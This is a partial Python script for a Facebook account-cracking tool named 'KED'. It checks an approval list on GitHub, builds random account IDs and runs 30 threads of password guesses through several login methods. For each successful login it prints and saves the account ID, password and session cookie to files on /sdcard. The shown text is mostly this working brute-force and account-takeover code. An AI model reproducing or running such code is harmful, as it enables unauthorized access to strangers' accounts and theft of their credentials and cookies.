...
╚═╝░░╚═╝╚══════╝╚═════╝░ 
\033[1;37m==============================================
\033[92;1m(>  \033[1;37mOwner         \033[1;32m :    \033[1;91mK \033[1;33mE \033[92;1mD
\033[92;1m(>  \033[1;37mFacebook      \033[1;32m :\033[1;97m   ked 
\033[92;1m(>  \033[1;37mGithub        \033[1;32m : \033[1;97m  secret
...
def mang_check():
  ...
  print(logo)
  try: 
    httpCaht = requests.get("https://github.com/https://github.com/arkogami/ked/Aproval.txt").text 
    if id in httpCaht: 
      ...
      time.sleep(2)
      clear()
      print("\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m WELCOME TO OUR KED TOOLS \033[1;37m ENJOY ")
      msg = str(os.geteuid()) 
      time.sleep(1) 
      pass 
    else: 
...
def rndbd():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ked(max_workers=30) as ked:
        clear()
        tl = str(len(user))
        ...
        for love in user:
            ...
            ids = code+love
            if mthdx in ['A','1']:ked.submit(rndi1,ids,pwx,tl)            	
            if mthdx in ['B','2']:ked.submit(api2,ids,pwx,tl)          	
            if mthdx in ['C','3']:ked.submit(graph,ids,pwx,tl)            	
            if mthdx in ['D','4']:ked.submit(graph2,ids,pwx)                	
    print('\033[1;37m')
    linex()
    ...
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                print(f'\r\33[1;37m[ked]-[OK]\33[1;37m '+ids+' \033[1;30m|\033[1;32m '+pas+'\33[1;37m')
                print(f'\r\33[1;37m[CookiE]-[OK]\33[1;32m '+kuki+'')
                linex()
                open('/sdcard/ked/ked-RANDOM-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
            	#print(ids,pas)
    ...
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                ids = re.findall('c_user=(.*);xs', kuki)[0]
                print(f'\r\033[1;32m[ked]-[OK] '+ids+' | '+pas+'\033[1;92m')
               # print("\r\r\033[1;34m[ðŸª\033[1;34m]\033[1;32m :\033[1;37m {kuki}")
                oks.append(ids)
                open('//sdcard/YousuF/ked-rnd--OK.txt','a').write(ids+' | '+pas+'\n')
                open('/sdcard/ked/ked-rnd--COOKIE','a').write(ids+' | '+pas+' | '+kuki+'\n')
                break
                                ...
                                if ids in oks:pass
                                        ...
                                        open('/sdcard/ked/ked-rnd-CP.txt','a').write(str(ids)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
            else:continue
            	#print(ids,pas)
